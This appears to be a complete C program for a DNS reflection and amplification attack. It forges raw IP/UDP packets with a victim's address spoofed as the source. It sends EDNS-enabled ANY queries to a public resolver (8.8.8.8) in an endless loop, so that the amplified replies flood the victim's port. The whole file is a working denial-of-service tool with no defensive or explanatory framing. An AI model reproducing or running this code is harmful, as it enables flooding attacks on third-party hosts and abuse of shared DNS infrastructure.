/*
Copyright (c) 2013, Ethan Willoner
All rights reserved.
Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of the <organization> nor the
      names of its contributors may be used to endorse or promote products
      derived from this software without specific prior written permission.
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#pragma pack(1)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>



// Typedef the ip_headerdr and udp_headerdr from the netinet libs to prevent 
// an infestation of "struct" in all the checksum and size calculations
typedef struct iphdr ip_header;
typedef struct udphdr udp_header;


// Pseudoheader struct
typedef struct
{
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}ps_header;

// DNS header struct
typedef struct
{
	unsigned short dnshdr_id; 		// ID
	unsigned short dnshdr_flags;	// DNS Flags
	unsigned short dnshdr_qcount;	// Question Count
	unsigned short dnshdr_ans;		// Answer Count
	unsigned short dnshdr_auth;	// Authority RR
	unsigned short dnshdr_add;		// Additional RR
}dns_header;

// Question types
typedef struct
{
	unsigned short dns_type;
	unsigned short dns_class;
}quest_type;

typedef struct{
	unsigned char name;
	unsigned short type;
	unsigned short udplength;
	unsigned char rcode;
	unsigned char ednsversion;
	unsigned short Z;
	unsigned short datalength;
}dns_opt;

void error(char *str)
{
    printf("%s\n",str);
}

unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	for(;nbytes>1;nbytes-=2){
		sum+=*ptr++;
	}

	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void urlFormatTransform(unsigned char *after, unsigned char *before){
	// ex. www.google.com -> 3www6google3com0
	strcat((char*)before,".");
	int i, j = 0; 
	for(i = 0 ; i < strlen((char*)before);i++) 
	{
		if(before[i]=='.'){
			*after++ = i - j;
			for(;j<i;j++) *after++ = before[j];
			j++;
		}
	}
	*after++ = 0x00;
	return;
}
void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dns_port,
	unsigned char *query_url)
{
	// Building the DNS request data packet
	unsigned char dns_rcrd[32];
	unsigned char *dns_url1;
	dns_url1 = malloc(32);
	strcpy(dns_rcrd, query_url);
	urlFormatTransform(dns_url1 , dns_rcrd);

	int buflen = sizeof(dns_header) + (strlen(dns_url1)+1)+ sizeof(quest_type)+sizeof(dns_opt);
	unsigned char dns_data[buflen];
	//Build DNS Header	
	dns_header *dns = (dns_header *)&dns_data;
	dns->dnshdr_id = (unsigned short) htons(getpid());
	dns->dnshdr_flags = htons(0x0100);
	dns->dnshdr_qcount = htons(1);
	dns->dnshdr_ans = 0;
	dns->dnshdr_auth = 0;
	dns->dnshdr_add = htons(1);
	
	unsigned char *dns_url;
	dns_url = (unsigned char *)&dns_data[sizeof(dns_header)];
	urlFormatTransform(dns_url , dns_rcrd);
	//Build DNS Query Info
	quest_type *q;
	q = (quest_type *)&dns_data[sizeof(dns_header) + (strlen(dns_url)+1)];
	q->dns_type = htons(0x00ff);
	q->dns_class = htons(0x1);
	//Build EDNS Additional Record
	dns_opt * dopt = (dns_opt *)&dns_data[sizeof(dns_header) + (strlen(dns_url)+1)+ sizeof(quest_type)];
	dopt->name = 0;
	dopt->type = htons(41);
	dopt->udplength = htons(4096);
	dopt->rcode = 0;
	dopt->ednsversion = 0;
	dopt->Z = htons(0x8000);
	dopt->datalength = 0;

	// Building the IP and UDP headers
	char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
	data = datagram + sizeof(ip_header) + sizeof(udp_header);
    memcpy(data, &dns_data, sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type) +sizeof(dns_opt)+1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dns_port);
    sin.sin_addr.s_addr = inet_addr(dns_server);
    
    ip_header *ip = (ip_header *)datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(ip_header) + sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(victim_ip);
    ip->daddr = sin.sin_addr.s_addr;
	ip->check = csum((unsigned short *)datagram, ip->tot_len);
	
    udp_header *udp = (udp_header *)(datagram + sizeof(ip_header));
	udp->source = htons(victim_port);
    udp->dest = htons(dns_port);
    udp->len = htons(8+sizeof(dns_header)+(strlen(dns_url)+1)+sizeof(quest_type)+sizeof(dns_opt));
    udp->check = 0;
	
	// Pseudoheader creation and checksum calculation
	ps_header pshdr;
	pshdr.saddr = inet_addr(victim_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt));

	int pssize = sizeof(ps_header) + sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt);
    psgram = malloc(pssize);
	
    memcpy(psgram, (char *)&pshdr, sizeof(ps_header));
    memcpy(psgram + sizeof(ps_header), udp, sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt));
		
    udp->check = csum((unsigned short *)psgram, pssize);
    
    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd==-1) error("Could not create socket.");
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    
	free(psgram);
	close(sd);
	
	return;
}
void usage(char *str);

int main(int argc, char **argv)
{	
	// Initial uid check and argument count check
	if(getuid()!=0)
		error("You must be running as root!");
	if(argc<2)
		usage(argv[0]);
	
	// Assignments to variables from the given arguments
	char *victim_ip = argv[1];
	int victim_port = atoi(argv[2]);
	int dns_port = 53;
	while(1) {
		reflectionAttack(victim_ip, victim_port, "8.8.8.8", 53, "ieee.org");
		sleep(2);
	}	
	return 0;
}

void usage(char *str)
{
	printf("%s\n target port\n", str);
	exit(0);
}
